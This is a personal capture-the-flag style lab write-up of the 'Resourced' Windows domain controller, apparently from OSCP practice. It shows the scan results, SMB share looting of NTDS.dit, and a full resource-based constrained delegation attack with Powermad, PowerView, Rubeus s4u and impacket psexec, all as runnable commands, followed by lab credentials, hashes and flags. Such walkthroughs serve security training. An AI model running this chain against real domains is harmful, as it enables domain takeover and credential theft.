# Resourced \[Inter]

## Report



## Enumeration

192.168.247.175

resourced.local

resourcedc.resource.local

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-01-22 17:18:32Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: resourced.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: resourced.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=ResourceDC.resourced.local
| rdp-ntlm-info: 
|   Target_Name: resourced
|   NetBIOS_Domain_Name: resourced
|   NetBIOS_Computer_Name: RESOURCEDC
|   DNS_Domain_Name: resourced.local
|   DNS_Computer_Name: ResourceDC.resourced.local
|   DNS_Tree_Name: resourced.local
|   Product_Version: 10.0.17763
|_  System_Time: 2024-01-22T17:19:21+00:00
|_ssl-date: 2024-01-22T17:20:01+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
Service Info: Host: RESOURCEDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-01-22T17:19:22
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```

```
└─$ sudo nmap -Pn -n $IP -sU --top-ports=100 --reason
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-22 12:25 EST
Nmap scan report for 192.168.226.175
Host is up, received user-set (0.082s latency).
Not shown: 97 open|filtered udp ports (no-response)
PORT    STATE SERVICE      REASON
53/udp  open  domain       udp-response ttl 125
88/udp  open  kerberos-sec udp-response ttl 125
123/udp open  ntp          udp-response ttl 125
```

> NTP matters because this machine is clearly a Domain Server using kerberos authentication which means that the Time has to be synced (within five minutes) between the machines. Let’s quickly synchronize our swatches so we don’t get caught up later.

`sudo ntpdate $IP`

**RPC**

Found creds for V.Ventz:HotelCalifornia194!

No password reuse

**SMB also timing out - gotcha**

No winrm access

Bloodhound fully flopped - I dont see anything except one user worth looking for

### Files

"Active Directory" and "registry" shares had the following files needed to crack hashes

### Initial Foothold

SMB share had NTDS.dit and SYSTEM, crack domain passwords using secretsdump.py but Adminsitrator hash did not work

## PrivEsc

L.Livingstone has GenericAll over the entire computer

First, if an attacker does not control an account with an SPN set, Kevin Robertson's Powermad project can be used to add a new attacker-controlled computer account:

Run Powermad and PowerView by

`. .\PowerView.ps1`

`. .\Powermad.ps1`

`New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)`&#x20;

PowerView can be used to then retrieve the security identifier (SID) of the newly created computer account:

`$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid`

&#x20;We now need to build a generic ACE with the attacker-added computer SID as the principal, and get the binary bytes for the new DACL/ACE:

`$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"`&#x20;

`$SDBytes = New-Object byte[] ($SD.BinaryLength)`&#x20;

`$SD.GetBinaryForm($SDBytes, 0)`&#x20;

Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the comptuer account we're taking over, again using PowerView in this case:

`Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}`&#x20;

We can then use Rubeus to hash the plaintext password into its RC4\_HMAC form:

`Rubeus.exe hash /password:Summer2018!`&#x20;

And finally we can use Rubeus' _s4u_ module to get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:

`Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt`

Convert the kirbi ticket to ccache and psexec

`base64 -d ticket.kirbi > ticket.kirbi_b64`

`ticketConverter.py ~/oscp/pg/windows/resourced/ticket/ticket.kirbi_b64 ~/oscp/pg/windows/resourced/ticket/ticket.ccache`

`sudo impacket-psexec -k -no-pass resourcedc.resourced.local -dc-ip 192.168.247.175`

## Loot

### Creds

`v.ventz:HotelCalifornia194!`

`L.Livingstone:19a3a7550ce8c505c2d46b5e39d6f808`

### Flags

`local:f69122923d0b432147496e8877c9cb9a`

d121e8cde1d0e0cc23c18810be89074c

## Proof

we're him.

This is what klist output should look like

```
┌──(jtripz㉿kali)-[~/…/pg/windows/resourced/ticket]
└─$ klist                                                                                                                  
Ticket cache: FILE:./ticket.ccache
Default principal: Administrator@RESOURCED.LOCAL

Valid starting     Expires            Service principal
11/04/25 23:47:52  11/05/25 09:47:52  cifs/resourcedc.resourced.local@RESOURCED.LOCAL
        renew until 11/11/25 23:47:52
```

The principal here is the computer itself, here's the previous one when we put 'admin' in Rubeus s4uproxy

```
┌──(jtripz㉿kali)-[/opt/impacket/examples]
└─$ klist                                                                                                                  
Ticket cache: FILE:/home/jtripz/oscp/pg/windows/resourced/ticket.ccache
Default principal: attackersystem$@RESOURCED.LOCAL

Valid starting     Expires            Service principal
11/04/25 23:28:05  11/05/25 09:28:05  krbtgt/resourced.local@RESOURCED.LOCAL
        renew until 11/11/25 23:28:05
```
